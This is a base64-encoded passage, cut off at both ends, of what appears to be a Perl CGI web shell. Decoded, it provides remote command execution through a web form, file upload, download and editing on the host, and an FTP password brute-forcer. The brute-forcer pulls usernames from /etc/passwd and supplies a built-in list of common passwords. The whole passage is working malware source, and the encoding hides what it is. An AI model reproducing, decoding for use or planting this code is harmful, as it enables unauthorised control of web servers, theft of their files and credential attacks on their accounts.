QgY2xhc3M9InN1Ym1pdCIgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0idXBsb2FkIj4KCjwvZm9ybT4KCkVORAp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8KIyB0ZXJtaW5hdGUgdGhlIHNjcmlwdCBpbW1lZGlhdGVseS4gVGhpcyBmdW5jdGlvbiBpcyB2YWxpZCBvbmx5IG9uIFVuaXguIEl0IGlzCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBDb21tYW5kVGltZW91dAp7CglpZighJFdpbk5UKQoJewoJCWFsYXJtKDApOwoJCXJldHVybiA8PEVORDsKPC90ZXh0YXJlYT4KPGJyPjxmb250IGNvbG9yPXllbGxvdz4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLjwvZm9udD4KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsZWQgaXQhPC9mb250PgpFTkQKCX0KfQoKCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXIKIyB0byBkb3dubG9hZCB0aGUgc3BlY2lmaWVkIGZpbGUuIFRoZSBwYWdlIGFsc28gY29udGFpbnMgYSBhdXRvLXJlZnJlc2gKIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5LgojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQp7Cglsb2NhbCgkRmlsZVVybCkgPSBAXzsKCW15ICRyZXN1bHQ9IiI7CglpZigtZSAkRmlsZVVybCkgIyBpZiB0aGUgZmlsZSBleGlzdHMKCXsKCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyCgkJJEZpbGVVcmwgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJCSREb3dubG9hZExpbmsgPSAiJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZj0kRmlsZVVybCZvPWdvIjsKCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkcmVzdWx0IC49IDw8RU5EOwpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4KCklmIHRoZSBkb3dubG9hZCBkb2VzIG5vdCBzdGFydCBhdXRvbWF0aWNhbGx5LAo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPgpFTkQKCQkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJfQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdAoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOwoJCSRyZXN1bHQgLj0gJlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiByZWFkcyB0aGUgc3BlY2lmaWVkIGZpbGUgZnJvbSB0aGUgZGlzayBhbmQgc2VuZHMgaXQgdG8gdGhlCiMgYnJvd3Nlciwgc28gdGhhdCBpdCBjYW4gYmUgZG93bmxvYWRlZCBieSB0aGUgdXNlci4KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXIKewoJbXkgJHJlc3VsdCA9ICIiOwoJbG9jYWwoJFNlbmRGaWxlKSA9IEBfOwoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZwoJewoJCWlmKCRXaW5OVCkKCQl7CgkJCWJpbm1vZGUoU0VOREZJTEUpOwoJCQliaW5tb2RlKFNURE9VVCk7CgkJfQoJCSRGaWxlU2l6ZSA9IChzdGF0KCRTZW5kRmlsZSkpWzddOwoJCSgkRmlsZW5hbWUgPSAkU2VuZEZpbGUpID1+ICBtIShbXi9eXFxdKikkITsKCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7CgkJcHJpbnQgIkNvbnRlbnQtTGVuZ3RoOiAkRmlsZVNpemVcbiI7CgkJcHJpbnQgIkNvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSQxXG5cbiI7CgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7CgkJY2xvc2UoU0VOREZJTEUpOwoJCWV4aXQoMSk7Cgl9CgllbHNlICMgZmFpbGVkIHRvIG9wZW4gZmlsZQoJewoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsKCQkkcmVzdWx0IC49JlByaW50RmlsZURvd25sb2FkRm9ybTsKCX0KCXJldHVybiAkcmVzdWx0Owp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHVzZXIgZG93bmxvYWRzIGEgZmlsZS4gSXQgZGlzcGxheXMgYSBtZXNzYWdlCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojIFRoaXMgZnVuY3Rpb24gaXMgYWxzbyBjYWxsZWQgd2hlbiB0aGUgdXNlciBjbGlja3Mgb24gdGhhdCBsaW5rLiBJbiB0aGlzIGNhc2UsCiMgdGhlIGZpbGUgaXMgcmVhZCBhbmQgc2VudCB0byB0aGUgYnJvd3Nlci4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgQmVnaW5Eb3dubG9hZAp7CgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwKCQkoISRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlwvLykpKSAjIHBhdGggaXMgYWJzb2x1dGUKCXsKCQkkVGFyZ2V0RmlsZSA9ICRUcmFuc2ZlckZpbGU7Cgl9CgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQoJewoJCWNob3AoJFRhcmdldEZpbGUpIGlmKCRUYXJnZXRGaWxlID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87CgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsKCX0KCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQoJewoJCSZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7Cgl9CgllbHNlICMgd2UgaGF2ZSB0byBzZW5kIG9ubHkgdGhlIGxpbmsgcGFnZQoJewoJCSZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlLiBJZiB0aGUKIyBmaWxlIGlzIG5vdCBzcGVjaWZpZWQsIGl0IGRpc3BsYXlzIGEgZm9ybSBhbGxvd2luZyB0aGUgdXNlciB0byBzcGVjaWZ5IGEKIyBmaWxlLCBvdGhlcndpc2UgaXQgc3RhcnRzIHRoZSB1cGxvYWQgcHJvY2Vzcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpzdWIgVXBsb2FkRmlsZQp7CgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgdXBsb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJcmV0dXJuICZQcmludEZpbGVVcGxvYWRGb3JtOwoKCX0KCW15ICRyZXN1bHQ9IiI7CgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2VzcwoJJHJlc3VsdCAuPSAiVXBsb2FkaW5nICRUcmFuc2ZlckZpbGUgdG8gJEN1cnJlbnREaXIuLi48YnI+IjsKCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkCgljaG9wKCRUYXJnZXROYW1lKSBpZiAoJFRhcmdldE5hbWUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsKCSRUcmFuc2ZlckZpbGUgPX4gbSEoW14vXlxcXSopJCE7CgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsKCgkkVGFyZ2V0RmlsZVNpemUgPSBsZW5ndGgoJGlueydmaWxlZGF0YSd9KTsKCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdAoJaWYoLWUgJFRhcmdldE5hbWUgJiYgJE9wdGlvbnMgbmUgIm92ZXJ3cml0ZSIpCgl7CgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOwoJfQoJZWxzZSAjIGZpbGUgaXMgbm90IHByZXNlbnQKCXsKCQlpZihvcGVuKFVQTE9BREZJTEUsICI+JFRhcmdldE5hbWUiKSkKCQl7CgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOwoJCQlwcmludCBVUExPQURGSUxFICRpbnsnZmlsZWRhdGEnfTsKCQkJY2xvc2UoVVBMT0FERklMRSk7CgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOwoJCQkkcmVzdWx0IC49ICJGaWxlIFBhdGg6ICRUYXJnZXROYW1lPGJyPiI7CgkJfQoJCWVsc2UKCQl7CgkJCSRyZXN1bHQgLj0gIkZhaWxlZDogJCE8YnI+IjsKCQl9Cgl9CgkkcmVzdWx0IC49ICZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUaGlzIGZ1bmN0aW9uIGlzIGNhbGxlZCB3aGVuIHRoZSB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZS4gSWYgdGhlCiMgZmlsZW5hbWUgaXMgbm90IHNwZWNpZmllZCwgaXQgZGlzcGxheXMgYSBmb3JtIGFsbG93aW5nIHRoZSB1c2VyIHRvIHNwZWNpZnkgYQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluawojIHRocm91Z2ggIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBEb3dubG9hZEZpbGUKewoJIyBpZiBubyBmaWxlIGlzIHNwZWNpZmllZCwgcHJpbnQgdGhlIGRvd25sb2FkIGZvcm0gYWdhaW4KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpCgl7CgkJJlByaW50UGFnZUhlYWRlcigiZiIpOwoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOwoJfQoJCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkCglpZigoJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXFx8Xi46LykpIHwgKCEkV2luTlQgJiAoJFRyYW5zZmVyRmlsZSA9fiBtL15cLy8pKSkgIyBwYXRoIGlzIGFic29sdXRlCgl7CgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOwoJfQoJZWxzZSAjIHBhdGggaXMgcmVsYXRpdmUKCXsKCQljaG9wKCRUYXJnZXRGaWxlKSBpZigkVGFyZ2V0RmlsZSA9ICRDdXJyZW50RGlyKSA9fiBtL1tcXFwvXSQvOwoJCSRUYXJnZXRGaWxlIC49ICRQYXRoU2VwLiRUcmFuc2ZlckZpbGU7Cgl9CgoJaWYoJE9wdGlvbnMgZXEgImdvIikgIyB3ZSBoYXZlIHRvIHNlbmQgdGhlIGZpbGUKCXsKCQlyZXR1cm4gJlNlbmRGaWxlVG9Ccm93c2VyKCRUYXJnZXRGaWxlKTsKCX0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlCgl7CgkJcmV0dXJuICZQcmludERvd25sb2FkTGlua1BhZ2UoJFRhcmdldEZpbGUpOwoJfQp9CgoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGV4ZWN1dGUgY29tbWFuZHMuIEl0IGRpc3BsYXlzIHRoZSBvdXRwdXQgb2YgdGhlCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkKIyBjb21tYW5kIGlzIGhhbmRsZWQgZGlmZmVyZW50bHkuIEluIHRoaXMgY2FzZSwgdGhlIG5ldyBkaXJlY3RvcnkgaXMgc3RvcmVkIGluCiMgYW4gaW50ZXJuYWwgdmFyaWFibGUgYW5kIGlzIHVzZWQgZWFjaCB0aW1lIGEgY29tbWFuZCBoYXMgdG8gYmUgZXhlY3V0ZWQuIFRoZQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzCiMgdGhlcmVmb3JlIGVycm9yIG1lc3NhZ2VzIGNhbm5vdCBiZSBkaXNwbGF5ZWQuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIEV4ZWN1dGVDb21tYW5kCnsKCW15ICRyZXN1bHQ9IiI7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4iY2QgJDEiLiRDbWRTZXAuJENtZFB3ZDsKCQljaG9wKCRDdXJyZW50RGlyID0gYCRDb21tYW5kYCk7CgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsKCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZCA8L3J1bj48YnI+PHRleHRhcmVhIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQoJCSRSdW5Db21tYW5kPSAkV2luTlQ/ImRpciI6ImRpciAtbGlhIjsKCQkkcmVzdWx0IC49ICZSdW5DbWQ7Cgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQoJewoJCSRyZXN1bHQgLj0gICZTYXZlRmlsZUZvcm07Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7CgkJJHJlc3VsdCAuPSZSdW5DbWQ7Cgl9CgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBydW4gY29tbWFuZAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpzdWIgUnVuQ21kCnsKCW15ICRyZXN1bHQ9IiI7CgkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuJFJ1bkNvbW1hbmQuJFJlZGlyZWN0b3I7CglpZighJFdpbk5UKQoJewoJCSRTSUd7J0FMUk0nfSA9IFwmQ29tbWFuZFRpbWVvdXQ7CgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOwoJfQoJaWYoJFNob3dEeW5hbWljT3V0cHV0KSAjIHNob3cgb3V0cHV0IGFzIGl0IGlzIGdlbmVyYXRlZAoJewoJCSR8PTE7CgkJJENvbW1hbmQgLj0gIiB8IjsKCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsKCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJewoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsKCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOwoJCX0KCQkkfD0wOwoJfQoJZWxzZSAjIHNob3cgb3V0cHV0IGFmdGVyIGNvbW1hbmQgY29tcGxldGVzCgl7CgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygnJENvbW1hbmQnKTsKCX0KCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgRm9ybSBTYXZlIEZpbGUgCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlRm9ybQp7CglteSAkcmVzdWx0ID0iIjsKCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOwoJbXkgJGZpbGU9JnRyaW0oJFJ1bkNvbW1hbmQpOwoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgY2xhc3M9InN1Ym1pdCIgPic7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsKCW15ICRkaXI9IjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IE9wZW4gU2FuczsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7CglpZigtdyAkRmlsZSkKCXsKCQkkcm93cz0iMjMiCgl9ZWxzZQoJewoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBPcGVuIFNhbnM7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOwoJCSRyb3dzPSIyMCIKCX0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsKCSRyZWFkPSgkV2luTlQpPyJ0eXBlIjoibGVzcyI7CgkkUnVuQ29tbWFuZCA9ICIkcmVhZCBcIiRSdW5Db21tYW5kXCIiOwoJJHJlc3VsdCAuPSAgPDxFTkQ7Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPgoJJFByb21wdAoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+Cgk8YnI+Q29tbWFuZDogPHJ1bj4gJFJ1bkNvbW1hbmQgPC9ydW4+Cgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4KRU5ECgkKCSRyZXN1bHQgLj0gJlJ1bkNtZDsKCSRyZXN1bHQgLj0gICI8L3RleHRhcmVhPiI7CgkkcmVzdWx0IC49ICAiPC9mb3JtPiI7CglyZXR1cm4gJHJlc3VsdDsKfQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgU2F2ZSBGaWxlCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc3ViIFNhdmVGaWxlKCQpCnsKCW15ICREYXRhPSBzaGlmdCA7CglteSAkRmlsZT0gc2hpZnQ7CgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsKCWlmKG9wZW4oRklMRSwgIj4kRmlsZSIpKQoJewoJCWJpbm1vZGUgRklMRTsKCQlwcmludCBGSUxFICREYXRhOwoJCWNsb3NlIEZJTEU7CgkJcmV0dXJuIDE7Cgl9ZWxzZQoJewoJCXJldHVybiAwOwoJfQp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCcnV0ZSBGb3JjZXIgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCcnV0ZUZvcmNlckZvcm0KewoJbXkgJHJlc3VsdD0iIjsKCSRyZXN1bHQgLj0gPDxFTkQ7Cgo8dGFibGU+Cgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPgpTaW1wbGUgRlRQIGJydXRlIGZvcmNlcjxicj4KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgoKPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJydXRlZm9yY2VyIi8+CjwvdGQ+CjwvdHI+Cjx0cj4KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPgpFTkQKY2hvcCgkcmVzdWx0IC49IGBsZXNzIC9ldGMvcGFzc3dkIHwgY3V0IC1kOiAtZjFgKTsKJHJlc3VsdCAuPSA8PCdFTkQnOwo8L3RleHRhcmVhPjwvdGQ+Cjx0ZD4KClBhc3M6PGJyPgo8dGV4dGFyZWEgcm93cz0iMTgiIGNvbHM9IjMwIiBuYW1lPSJwYXNzIj4xMjNwYXNzCjEyMyFAIwoxMjNhZG1pbgoxMjNhYmMKMTIzNDU2YWRtaW4KMTIzNDU1NDMyMQoxMjM0NDMyMQpwYXNzMTIzCmFkbWluCmFkbWluY3AKYWRtaW5pc3RyYXRvcgptYXRraGF1CnBhc3NhZG1pbgpwQHNzd29yZApwQHNzdzByZApwYXNzd29yZAoxMjM0NTYKMTIzNDU2NwoxMjM0NTY3OAoxMjM0NTY3ODkKMTIzNDU2Nzg5MAoxMTExMTEKMDAwMDAwCjIyMjIyMgozMzMzMzMKNDQ0NDQ0CjU1NTU1NQo2NjY2NjYKNzc3Nzc3Cjg4ODg4OAo5OTk5OTkKMTIzMTIzCjIzNDIzNAozNDUzNDUKNDU2NDU2CjU2NzU2Nwo2Nzg2NzgKNzg5Nzg5CjEyMzMyMQo0NTY2NTQKNjU0MzIxCjc2NTQzMjEKODc2NTQzMjEKOTg3NjU0MzIxCjA5ODc2NTQzMjEKYWRtaW4xMjMKYWRtaW4xMjM0NTYKYWJjZGVmCmFiY2FiYwohQCMhQCMKIUAjJCVeCiFAIyQlXiYqKAohQCMkJCNAIQphYmMxMjMKYW5oeWV1ZW0KaWxvdmV5b3U8L3RleHRhcmVhPgo8L3RkPgo8L3RyPgo8dHI+Cjx0ZCBjb2xzcGFuPSIyIiBhbGlnbj0iY2VudGVyIj4KU2xlZXA6PHNlbGVjdCBuYW1lPSJzbGVlcCI+Cgo8b3B0aW9uPjA8L29wdGlvbj4KPG9wdGlvbj4xPC9vcHRpb24+CjxvcHRpb24+Mjwvb3B0aW9uPgoKPG9wdGlvbj4zPC9vcHRpb24+Cjwvc2VsZWN0PiAKPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9InN1Ym1pdCIgdmFsdWU9IkJydXRlIEZvcmNlciIvPjwvdGQ+PC90cj4KPC9mb3JtPgo8L3RhYmxlPgpFTkQKcmV0dXJuICRyZXN1bH